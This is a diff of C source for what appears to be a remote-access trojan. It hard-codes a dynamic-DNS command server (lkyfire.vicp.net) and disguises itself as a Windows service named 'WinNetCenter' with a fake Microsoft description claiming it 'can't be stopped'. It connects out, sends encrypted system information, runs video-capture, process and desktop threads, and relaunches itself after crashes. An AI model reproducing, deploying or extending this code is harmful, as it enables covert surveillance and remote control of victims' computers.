@@ -5,9 +5,6 @@
 #pragma comment(linker,"/NODEFAULTLIB:libcmt.lib")
 #pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98")
 
-#define DE
-#include "../../debug.h"
-
 #define LxProc
 #define LxFile
 #define LxScreem
@@ -23,7 +20,7 @@
 struct MODIFY_DATA
 {
 	char  strIPFile[128];   //ip文件or DNS						0
-	char  strVersion[16];   //服务端版本							128
+	char  strVersion[16];   //服务端版本						128
 	DWORD dwVipID;          //VIP ID							144
 	BOOL  bReplace;         //TRUE-替换服务，FALSE-新建服务		148
 	char  strSvrName[32];   //服务名称							149
@@ -33,59 +30,62 @@ struct MODIFY_DATA
 	int   ServerPort;		//Client port						481
 }modify_data =
 {
-	"botovinik.vicp.net:80",
-	"150614",
+	"lkyfire.vicp.net:80",
+	"20150913",
 	vipid,
 	FALSE,
 	"WinNetCenter",
 	"Microsoft(R) Multi Protocol Network Control Center",
 	"Provides supports for multi network Protocol. This service can't be stopped.",
-	"192.168.1.145",
+	"127.0.0.1",
 	80,
 };
 
 SOCKET MainSocket;
+HMODULE DllHandle;
 
 unsigned long _stdcall resolve(char *host)
 {
-	struct hostent *ser = NULL;
+	ULONG Ip = inet_addr(host);
 
-	long i = inet_addr(host);
-
-	if (i < 0) //Not Ip
+	if (Ip < 0) //Not Ip
 	{
-		ser = (struct hostent*)gethostbyname(host);
+		MsgErr("Host Mode");
 
-		if (ser == NULL)
+		struct hostent *HostInfo = (struct hostent*)gethostbyname(host);
+
+		if (HostInfo == NULL)
 		{
-			ser = (struct hostent*)gethostbyname(host); //retry
+			HostInfo = (struct hostent*)gethostbyname(host); //retry
 		}
 
-		if (ser != NULL)
+		if (HostInfo == NULL)
 		{
-			return (*(unsigned long *)ser->h_addr);
+			return 0;
 		}
 
-		return 0;
+		Ip = *(unsigned long *)HostInfo->h_addr;
 	}
 
-	return i;
+	return Ip;
 }
 
-SOCKET ConnectServer(int Port, char Addr[])
+SOCKET ConnectServer(char Addr[], int Port)
 {
 	struct sockaddr_in LocalAddr;
 	LocalAddr.sin_family = AF_INET;
 	LocalAddr.sin_port = htons(Port);
 	LocalAddr.sin_addr.S_un.S_addr = resolve(Addr);
 
-	SOCKET hSocket = socket(AF_INET, SOCK_STREAM, 0); //连接的socket
+	SOCKET hSocket = socket(AF_INET, SOCK_STREAM, 0);
 
-	int timeout = 45000;
-	setsockopt(hSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
+	//int timeout = INFINITE;
+	//setsockopt(hSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
 
 	if (connect(hSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
 	{
+		MsgErr("Can't Connect to %s:%d", Addr, Port);
+
 		closesocket(hSocket);
 
 		return SOCKET_ERROR;
@@ -98,12 +98,12 @@ SOCKET ConnectServer(int Port, char Addr[])
 
 inline SOCKET ConnectServer()
 {
-	return ConnectServer(modify_data.ServerPort, modify_data.ServerAddr);
+	return ConnectServer(modify_data.ServerAddr, modify_data.ServerPort);
 }
 
 DWORD _stdcall ConnectThread(LPVOID lParam)
 {
-	SetThreadPriority( GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL );
+	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
 
 	MainSocket = ConnectServer();
 
@@ -121,7 +121,6 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	lstrcpy(m_SysInfo.cVersion, modify_data.strVersion);
 	EncryptData((unsigned char *)&m_SysInfo, sizeof(SysInfo), modify_data.dwVipID);	//用产品ID号加密
 
-	//send socket type
 	MsgHead msgHead;
 	char chBuffer[4096];
 
@@ -580,7 +579,6 @@ DWORD _stdcall VideoThread(LPVOID lParam)
 		setsockopt(VideoSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//不采用延时算法
 	}
 
-	//==================================================================
 	MsgHead msgHead;
 	//send socket type
 	msgHead.dwCmd = SOCKET_VIDEOCAP;
@@ -669,7 +667,6 @@ DWORD _stdcall ProcessThread(LPVOID lParam)
 	MsgHead msgHead;
 	char chBuffer[32 * 1024]; //数据交换区
 
-	//send socket type
 	msgHead.dwCmd = SOCKET_PROCESS;
 	msgHead.dwSize = 0;
 	if (!SendMsg(ProcessSocket, chBuffer, &msgHead))
@@ -890,6 +887,7 @@ LONG _stdcall Errdo(_EXCEPTION_POINTERS *ExceptionInfo)
 	char SelfPath[128];
 	GetModuleFileName(GetModuleHandle(NULL), SelfPath, 128);
 	WinExec(SelfPath, 0);
+	MsgErr("Falt Error");
 
 	//return EXCEPTION_CONTINUE_EXECUTION;
 	return EXCEPTION_EXECUTE_HANDLER;
@@ -898,9 +896,13 @@ LONG _stdcall Errdo(_EXCEPTION_POINTERS *ExceptionInfo)
 
 DWORD WINAPI RoutineMain(LPVOID lp)
 {
-	//TCHAR MyPath[MAX_PATH*2];
-	//GetModuleFileName(hModule, MyPath, sizeof(MyPath));
-	//CreateFile(MyPath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	TCHAR ModulePath[MAX_PATH*2];
+	GetModuleFileName(DllHandle, ModulePath, sizeof(ModulePath));
+	CreateFile(ModulePath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+#ifdef LxScreem
+	OpenUserDesktop();
+#endif
 
 	if(lp != NULL)
 	{
@@ -908,8 +910,9 @@ DWORD WINAPI RoutineMain(LPVOID lp)
 	}
 	else
 	{
-		modify_data.ServerPort = 80;
+		modify_data.ServerPort = 80;		
 		lstrcpy(modify_data.ServerAddr, "127.0.0.1");	//192.168.1.145
+		//lstrcpy(modify_data.ServerAddr, "lkyfire.vicp.net");	//192.168.1.145
 	}
 
 	int state = 1;
@@ -920,7 +923,10 @@ DWORD WINAPI RoutineMain(LPVOID lp)
 		{
 			state = ConnectThread(NULL);
 		}
-		__except(1){}
+		__except(1)
+		{
+			MsgErr("RoutineMain");
+		}
 
 		if (state == 0) //Connect Error
 		{
@@ -932,6 +938,7 @@ DWORD WINAPI RoutineMain(LPVOID lp)
 		}
 		else if (state == -1) //Exit
 		{
+			//MsgErr("Exit Request");
 			return -1;
 		}
 
@@ -949,10 +956,6 @@ int WINAPI WinMain(HINSTANCE hInstance,
 				   LPSTR     lpCmdLine,
 				   int       nCmdShow)
 {
-#ifdef LxScreem
-	OpenUserDesktop();
-#endif
-
 #ifdef Lxform
 	HWND hwnd = CreateWindowExW(
 				   WS_EX_APPWINDOW,
@@ -1009,6 +1012,8 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
 {
 	if(ul_reason_for_call == DLL_PROCESS_ATTACH)
 	{
+		DllHandle = hModule;
+
 		DisableThreadLibraryCalls(hModule);
 		//CloseHandle(CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RoutineMain, NULL, 0, NULL));
 	}
